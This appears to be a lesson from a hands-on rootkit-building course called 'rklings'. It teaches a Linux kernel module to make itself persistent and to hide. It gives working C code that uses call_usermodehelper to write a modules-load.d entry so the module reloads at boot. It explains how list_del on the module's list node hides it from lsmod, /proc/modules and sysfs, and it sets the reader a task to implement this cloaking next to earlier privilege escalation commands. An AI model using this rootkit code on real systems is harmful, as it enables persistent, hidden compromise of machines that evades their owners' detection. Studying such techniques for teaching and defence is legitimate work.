# Persist across reboot and hide from lsmod

A rootkit that disappears on reboot is useless. A rootkit visible in lsmod
is caught. This milestone solves both problems.

## Persistence via call_usermodehelper

Linux reads `/etc/modules-load.d/*.conf` at boot. Each line names a module
to load. Writing `rklings` to `/etc/modules-load.d/rklings.conf` makes the
module survive reboots.

From kernel context, `call_usermodehelper` spawns a userspace process:

```c
static int rk_persist(void)
{
    char *argv[] = { "/bin/sh", "-c",
                     "echo rklings > /etc/modules-load.d/rklings.conf",
                     NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
                     NULL };

    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

`call_usermodehelper` creates a new process, executes the command, and
waits for it to finish (`UMH_WAIT_PROC`). The shell writes the file with
normal filesystem permissions. No filp_open, no kernel_write, no direct
VFS calls.

To remove persistence, delete the conf file the same way:

```c
static int rk_unpersist(void)
{
    char *argv[] = { "/bin/sh", "-c",
                     "rm -f /etc/modules-load.d/rklings.conf", NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
                     NULL };

    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

```text
mkdir rklings.persist
    |
    v
call_usermodehelper("/bin/sh", {"-c", "echo rklings > .../rklings.conf"}, ...)
    |
    v
UMH_WAIT_PROC: kernel waits for shell to finish
    |
    v
reboot -> init reads rklings.conf -> module loads automatically
```

## Module cloaking via list_del

The kernel tracks loaded modules in a doubly-linked list.
`lsmod` reads this list. Remove your module from the list and lsmod cannot
see it.

```text
module list:
  [mod_a] <-> [rklings] <-> [mod_b]

mkdir rklings.h.m:
  [mod_a] <-> [mod_b]
  (saved_prev = &mod_a.list)

mkdir rklings.u.m:
  [mod_a] <-> [rklings] <-> [mod_b]
  (restored via list_add)
```

`THIS_MODULE->list` is a `struct list_head`, a node in the kernel's global
module list. Three things to know:

1. `list_del(&THIS_MODULE->list)` removes the node. After this call,
   lsmod, /proc/modules, and sysfs all stop showing the module.
2. Save `THIS_MODULE->list.prev` before deleting. This pointer lets you
   re-insert later with `list_add(&THIS_MODULE->list, saved_prev)`.
3. Always unhide in module_exit. A hidden module can still be unloaded
   with `rmmod rklings` (the kernel finds it by name in a separate hash),
   but the list must be consistent before cleanup runs.

## New commands

Wire these four commands into your dispatcher:

| Command | Action |
|---------|--------|
| `mkdir rklings.persist` | Write module name to modules-load.d |
| `mkdir rklings.unpersist` | Remove the conf file |
| `mkdir rklings.h.m` | Hide module from lsmod |
| `mkdir rklings.u.m` | Unhide module |

The escalation commands from earlier lessons (`rklings.e`, `rklings.e.<pid>`)
must still work.

## Your task

The starter provides persistence (call_usermodehelper) already implemented.
Add module cloaking:

1. Declare `saved_prev` and `module_hidden` state variables
2. `rk_module_hide()`: save prev pointer, list_del, set hidden flag
3. `rk_module_unhide()`: list_add to restore, clear hidden flag
4. Wire `h.m` and `u.m` into the command dispatcher
5. Call `rk_module_unhide()` in module_exit before unregistering the probe

Run:

```sh
./rklings check
```

## References

- [Linux v7.2 `call_usermodehelper`][1]
- [Linux v7.2 module list: THIS_MODULE, list_del, list_add][2]
- [modules-load.d(5) boot-time module loading][3]

[1]: https://github.com/torvalds/linux/blob/v7.2/kernel/umh.c
[2]: https://github.com/torvalds/linux/blob/v7.2/include/linux/module.h
[3]: https://www.freedesktop.org/software/systemd/man/latest/modules-load.d.html
